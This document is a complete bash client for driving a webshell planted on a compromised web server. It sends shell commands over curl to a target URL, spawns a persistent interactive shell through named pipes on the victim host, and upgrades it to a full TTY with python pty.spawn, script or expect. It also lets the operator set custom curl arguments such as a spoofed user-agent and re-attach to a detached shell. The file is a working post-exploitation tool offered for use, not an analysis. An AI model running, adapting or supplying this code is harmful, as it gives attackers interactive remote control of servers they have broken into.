#!/bin/bash

#set default stty settings
stty sane
SHELL_CUSTOM="bash"
INIT_SHELL=""
interactive="no"
type_stty="no"
full_stty="no"
alias_set="no"
alias_custom=""
attach="no"
stream="no"
stream_keep_alive=5
URL=""
FI="/tmp/i"
FO="/tmp/o"
CURL_ARGS=()
CURL_MAXTIME=4

# List of available arguments
available_args=(
    "--interactive"
    "-i"
    "--stty-raw"
    "--stty-python"
    "--stty-expect"
    "--stty-script"
    "--stty-custom"
    "--shell"
    "--url"
    "-u"
    "--fi"
    "-fi"
    "--fo"
    "-fo"
    "--init-shell"
    "-ish"
    "-curl"
    "--curl"
    "--default"
    "-d"
    "--help"
    "-h"
    "--alias"
    "--alias-custom"
    "--attach"
    "--stream"
)


if [ -d "/dev/shm" ]; then
    FIFO_PATH="/dev/shm/.req_stream_$$"
    request_time="/dev/shm/.req_time_$$"
    config_file="/dev/shm/.config.ini_$$"
else
    FIFO_PATH="/tmp/.req_stream_$$"
    request_time="/tmp/.req_time_$$"
    config_file="/tmp/.config.ini_$$"
fi

rm -f $FIFO_PATH; mkfifo $FIFO_PATH;
touch $config_file
exec 5>&1;


get_config_value() {
    local setting=$1
    local value=$(grep "^$setting=" "$config_file" | cut -d '=' -f2)
    echo "$value"
}


update_config() {
    local setting=$1
    local value=$2

    # Check if the setting already exists in the configuration file
    if grep -q "^$setting=" "$config_file"; then
        # Setting exists, update its value
        sed -i "s/^$setting=.*/$setting=$value/" "$config_file"
    else
        # Setting doesn't exist, add it to the configuration file
        echo "$setting=$value" >> "$config_file"
    fi
}


exit_client() {
    echo -e "\nExiting script."
    pstree -A -p $$ | grep -Eow "[0-9]+" | grep -v $$ | xargs kill 2>/dev/null
    rm -f $FIFO_PATH
    rm -f $request_time
    rm -f $config_file
    stty sane
    wait
    echo -e "Cleanup complete."
    exit "$1"
}


help_client () {
    echo -e "Usage: $0 [OPTION]... --url [URL]...\n"
    

    printf "  %s  %-20s%s\n" "-h,   " "--help" "Display help menu"
    printf "  %s  %-20s%s\n" "-u,   " "--url" "The URL to the file: {--url http://localhost:8080/webshell.php}"
    printf "  %s  %-20s%s\n" "-curl," "--curl" "Script communicate with shell by curl. You can add arguments to curl, usage: {--curl '-X POST' -A 'My User-Agent 2.0'}"
    printf "  %s  %-20s%s\n" "-i,   " "--interactive" "Switch to interactive shell."
    printf "  %s  %-20s%s\n" "      " "--stty-raw" "Switch stty to raw mode. Switch to normal mode: {ctrl+alt+s}. While normal mode run switch to raw mode write command: {%:stty_raw}"
    printf "  %s  %-20s%s\n" "      " "--stty-python" "Send command to run python tty mode: {python -c \"import pty; pty.spawn('\$shell')\"}"
    printf "  %s  %-20s%s\n" "      " "--stty-expect" "Send interactive command to run expect tty mode: {0)expect 1)spawn \$shell 2)interact}"
    printf "  %s  %-20s%s\n" "      " "--stty-script" "Send command to run script tty mode: {script -qc /bin/bash /dev/null}"
    printf "  %s  %-20s%s\n" "      " "--stty-custom" "Send command to run custom tty mode: {--stty-custom \"/custom/path/python2.7 -c \\\"import pty; pty.spawn('/bin/zsh')\\\"\"}"
    printf "  %s  %-20s%s\n" "      " "--alias" "Send command for setup alias and export TERM: {export TERM=xterm-256color; alias ls='ls --color'; alias ll='ls -lsaht --color'}"
    printf "  %s  %-20s%s\n" "      " "--alias-custom" "Send command to setup custom alias and other command: {--alias-custom \"export TERM=screen-256color; alias ls='ls --color'; alias ll='ls -lsaht --color'\"}"
    printf "  %s  %-20s%s\n" "      " "--shell" "Change from default 'bash' to any shell for spawning interactive shell and stty: {--shell /usr/sbin/sh} "
    printf "  %s  %-20s%s\n" "-ish, " "--init-shell" "Change default command for spawning interactive shell: {--init-shell \"rm -f /tmp/i /tmp/o; mkfifo /tmp/i /tmp/o; bash -c 'exec 5<>/tmp/i; cat <&5| bash  2>/tmp/o >/tmp/o'\"}"
    printf "  %s  %-20s%s\n" "-fi,  " "--fi" "Interactive shell works on named pipes, so change name of stdin pipe: {--fi /dev/shm/some_input_pipe}"
    printf "  %s  %-20s%s\n" "-fo,  " "--fo" "Interactive shell works on named pipes, so change name of stdout, stderr pipe: {--fo /dev/shm/some_output_pipe}"
    printf "  %s  %-20s%s\n" "-d,   " "--default" "Script by default works with no interactive webshell. So flags set default interacte option: --interactive, --stty-raw, --stty-python, --alias. If you want change some of option you need provide next option after default options. {-d --stty-script --shell /bin/bash}"
    printf "  %s  %-20s%s\n" "      " "--attach" "Join a detached running shell process. To join the right shell, you need to use the same pipes that the shell process uses: {--attach --fi /dev/shm/i --fo /dev/shm/o}"
    printf "  %s  %-20s%s\n" "      " "--stream" "Create request stream. Available for Java Servlet, not working with php: {--stream}"
    printf "  %s  %-20s%s\n" "      " "" "To exit in normal mode stty usage: {ctrl+c} or write: {%:exit}. To exit in raw mode stty usage: {ctrl+alt+q}"

    exit_client "0"
}

while [ "$#" -gt 0 ]; do
    arg="$1"
    case "$arg" in
        "--default" | "-d")
            interactive="yes"
            type_stty="python"
            full_stty="yes"
            alias_set="yes"
            update_config "INTERACTIVE" "yes"
            update_config "TYPE_STTY" "python"
            update_config "FULL_STTY" "yes"
            update_config "ALIAS_SET" "yes"
            ;;
        "--interactive" | "-i")
            interactive="yes"
            update_config "INTERACTIVE" "yes"
            ;;
        "--stty-raw")
            full_stty="yes"
            update_config "FULL_STTY" "yes"
            ;;
        "--stty-python")
            type_stty="python"
            update_config "TYPE_STTY" "python"
            ;;
        "--stty-script")
            type_stty="script"
            update_config "TYPE_STTY" "script"
            ;;
        "--stty-expect")
            type_stty="expect"
            update_config "TYPE_STTY" "expect"
            ;;
        "--stty-custom")
            if [ -n "$2" ]; then
                type_stty="custom"
                update_config "TYPE_STTY" "custom"
                shift 
                stty_custom="$1"
                update_config "STTY_CUSTOM" "$1"
            else
                echo "[-] Error: Argument missing for --stty-custom"
                exit_client "1"
            fi
            ;;
        "--attach")
            attach="yes"
            interactive="yes"
            update_config "ATTACH" "yes"
            update_config "INTERACTIVE" "yes"
            ;;
        "--alias")
            alias_set="yes"
            update_config "ALIAS_SET" "yes"
            ;;
        "--alias-custom")
            if [ -n "$2" ]; then
                alias_set="custom"
                update_config "ALIAS_SET" "custom"
                shift 
                alias_custom="$1"
                update_config "ALIAS_CUSTOM" "$1"
            else
                echo "[-] Error: Argument missing for --alias-custom"
                exit_client "1"
            fi
            ;;
        "--shell")
            if [ -n "$2" ]; then
                shift 
                SHELL_CUSTOM="$1"
                update_config "SHELL_CUSTOM" "$1"
            else
                echo "[-] Error: Argument missing for --shell"
                exit_client "1"
            fi
            ;;
        "--url" | "-u")
            if [ -n "$2" ]; then
                shift 
                URL="$1"
                update_config "URL" "$1"
            else
                echo "[-] Error: Argument missing for --url"
                exit_client "1"
            fi
            ;;
        "--init-shell" | "-ish")
            if [ -n "$2" ]; then
                shift 
                INIT_SHELL="$1"
                update_config "INIT_SHELL" "$1"
            else
                echo "[-] Error: Argument missing for --url"
                exit_client "1"
            fi
            ;;
        "--fi" | "-fi")
            if [ -n "$2" ]; then
                shift 
                FI="$1"
                update_config "FI" "$1"
            else
                echo "[-] Error: Argument missing for --url"
                exit_client "1"
            fi
            ;;
        "--fo" | "-fo")
            if [ -n "$2" ]; then
                shift 
                FO="$1"
                update_config "FO" "$1"
            else
                echo "[-] Error: Argument missing for --url"
                exit_client "1"
            fi
            ;;
        "--stream")
            stream="yes"
            interactive="yes"
            update_config "STREAM" "yes"
            update_config "INTERACTIVE" "yes"
            ;;
        "--curl" | "-curl")
            type_curl="custom"
            update_config "TYPE_CURL" "custom"
            shift
            while [ "$#" -gt 0 ]; do
                if [[ " ${available_args[@]} " =~ " $1 " ]]; then
                    break  
                else
                    CURL_ARGS+=("$1")
                    update_config "CURL_ARGS" "$CURL_ARGS"
                    shift
                fi
            done
            continue
            ;;
        "--help" | "-h")
            help_client
            ;;
        *)
            echo "Unknown option: $arg"
            exit_client "1"
            ;;
    esac
    shift
done

if [[ "$URL" == "" ]]; then
    echo "[-] Error: Argument missing for --url"
    exit_client "1"
fi

trap 'exit_client "0"' SIGINT 


lcurl () {
    if [[ " ${CURL_ARGS[@]} " =~ "-X POST" ]]; then
        timeout $CURL_MAXTIME curl -s $URL "${CURL_ARGS[@]}" --data $1 2>1 >/dev/null
    else
        timeout $CURL_MAXTIME curl -s $URL?$1 "${CURL_ARGS[@]}" 2>1 >/dev/null
    fi
}

get_output () {
    curl -s -N $URL?o=$FO "${CURL_ARGS[@]}" 2>&5 >&5 
}


urlencode() {
  local string="$1"
  local result=""
  local length="${#string}"

  for ((i = 0; i < length; i++)); do
    char="${string:i:1}"
    case "$char" in
      [a-zA-Z0-9.~_-]) result+="$char" ;;
      *) result+="$(printf '%%%02X' "'$char")" ;;
    esac
  done

  echo "$result"
}

create_shell() {
    if [[ "$INIT_SHELL" == "" ]]; then
        shell="rm%20-f%20$FI%20$FO%3B%20mkfifo%20$FI%20$FO%3B%20$SHELL_CUSTOM%20-c%20%27exec%205%3C%3E$FI%3B%20cat%20%3C%265%7C%20$SHELL_CUSTOM%20%202%3E$FO%20%3E$FO%27";
    else
        shell="$(urlencode "$INIT_SHELL")"
    fi
    lcurl "c=$shell"
}

setup_stty() {
    local command_stty=""
    if [[ "$type_stty" == "custom" ]]; then
        command_stty=$(urlencode "$stty_custom") 
    elif [[ "$type_stty" == "no" ]]; then
        return 0
    elif [[ "$type_stty" == "python" ]]; then
        command_stty=$(urlencode "python -c \"import pty; pty.spawn('$SHELL_CUSTOM')\"") 
    elif [[ "$type_stty" == "expect" ]]; then
        #run interactive 0)expect 1)spawn $SHELL_CUSTOM 2)interact
        lcurl "i=expect%0A&fi=$FI"
        lcurl "i=$(urlencode "spawn $SHELL_CUSTOM")%0A&fi=$FI"
        lcurl "i=interact%0A&fi=$FI"
    elif [[ "$type_stty" == "script" ]]; then
        command_stty=$(urlencode "script -qc $SHELL_CUSTOM /dev/null")
    fi
    lcurl "i=$command_stty%0A&fi=$FI"
    sleep 1 
    local columns=$(tput cols)
    local rows=$(tput lines)
    lcurl "i=stty%20columns%20$columns%20rows%20$rows%0A&fi=$FI"
}

setup_shell() {
    if [[ "$attach" == "no" ]]; then
        create_shell
        get_output &
        setup_stty
        sleep 2
        if [[ "$alias_set" == "yes" ]]; then
            #export TERM=xterm-256color; alias ls='ls --color'; alias ll='ls -lsaht --color'
            lcurl "i=%65%78%70%6F%72%74%20%54%45%52%4D%3D%78%74%65%72%6D%2D%32%35%36%63%6F%6C%6F%72%3B%20%61%6C%69%61%73%20%6C%73%3D%27%6C%73%20%2D%2D%63%6F%6C%6F%72%27%3B%20%61%6C%69%61%73%20%6C%6C%3D%27%6C%73%20%2D%6C%73%61%68%74%20%2D%2D%63%6F%6C%6F%72%27%0A&fi=$FI"
        elif [[ "$alias_set" == "custom" ]]; then
            lcurl "i=$(urlencode "$alias_custom")%0A&fi=$FI"
        fi
    else 
        get_output &
    fi
 
}


keep_alive() {
    while true; do
        current_time=$(date +%s)
        local start_time=$(cat $request_time 2>/dev/null) 
        local elapsed_time=$((current_time - start_time))
        if [ "$elapsed_time" -ge "$stream_keep_alive" ]; then
            printf "%s" "%1b%1c" > $FIFO_PATH
            date +%s > $request_time
            continue
        fi
        sleep 1  
    done
}

send_command_stream () {
    exec 7<>$FIFO_PATH
    curl -s -N -X POST $URL"?s=$FI" "${CURL_ARGS[@]}" -T - <&7 2>1 >/dev/null
    cat $FIFO_PATH >/dev/null
}

send_command_requests () {
    while true; do
        local full_stty=$(get_config_value "FULL_STTY")
        chart=$(cat $FIFO_PATH);
        if [[ "$chart" == "%0A" ]]; then
            lcurl "i=$chart&fi=$FI"
        else
            if [[ "$full_stty" == "yes" ]]; then
                lcurl "i=$(urlencode "$chart")&fi=$FI"
            else
                lcurl "i=$(urlencode "$chart")%0A&fi=$FI"
            fi
        fi
    done
}

send_command() {
    if [[ "$stream" == "yes" ]]; then
        keep_alive &
        send_command_stream &
    else 
        send_command_requests &
    fi 
}

read_command_full_stty() {
    local combination=""
    while true; do
        # Use dd to read a single byte of raw input
        userInput=$(dd bs=1 count=1 2>/dev/null)
        combination+="$userInput"
        # Check if the user wants to exit
        if [[ "$combination" == *$'\x1b\x11'* ]]; then
            exit_client "0"
#        elif [[ "$combination" == *$'\x1b\x15'* ]]; then
#            local a=$(cat ./a |base64 -w 0)
#            echo "Start uploading file"
#            lcurl "i=%0Aread%20content%3Bprintf%20$content%20%7Cbase64%20-d%20%3E%20/dev/shm/a%0A&fi=$FI"
#            echo "file upload"
        elif [[ "$combination" == *$'\x1b\x13'* ]]; then
            full_stty="no"
            update_config "FULL_STTY" "no"
            echo "Change to normal mode stty!"
            break
        fi
        # Check if Enter key was pressed
        if [[ "$userInput" == $'\x0d' || "$userInput" == $'\x0a' ]]; then
            userInput="%0A"
            combination=""
        fi
        if [[ "$stream" == "yes" ]]; then 
            date +%s > $request_time
            if [[ "$userInput" == "%0A" ]]; then
                printf "%s" "$userInput" >> "$FIFO_PATH"
            else
                printf "%s" "$(urlencode "$userInput")" >> "$FIFO_PATH"
            fi
        else
            printf "%s" "$userInput" >> "$FIFO_PATH"
        fi 
    done
}

read_command_semi_stty() {
    while read command; do
        if [[ "$command" == "%:stty_raw" ]]; then
            echo "Change to raw mode stty!"
            full_stty="yes"
            update_config "FULL_STTY" "yes"
            break
        elif [[ "$command" == "%:exit" ]]; then
            exit_client "0"
        else
            if [[ "$stream" == "yes" ]]; then 
                date +%s > $request_time
                printf "%s" "$(urlencode "$command")%0A" >> $FIFO_PATH
            else
                printf "%s" "$command" >> $FIFO_PATH
            fi 
        fi
    done
}


if [[ "$interactive" == "yes" ]]; then
    setup_shell 
    send_command 
    while true; do 
        if [[ "$full_stty" == "yes" ]]; then
            stty raw -echo;
            read_command_full_stty
        else
            stty sane
            read_command_semi_stty
        fi
    done
else 
    while read line; do
        if [[ " ${CURL_ARGS[@]} " =~ "-X POST" ]]; then
            curl -s $URL "${CURL_ARGS[@]}" --data "c=$(urlencode "$line")"
        else
            curl -s $URL"?c=$(urlencode "$line")" "${CURL_ARGS[@]}" 
        fi
    done
fi
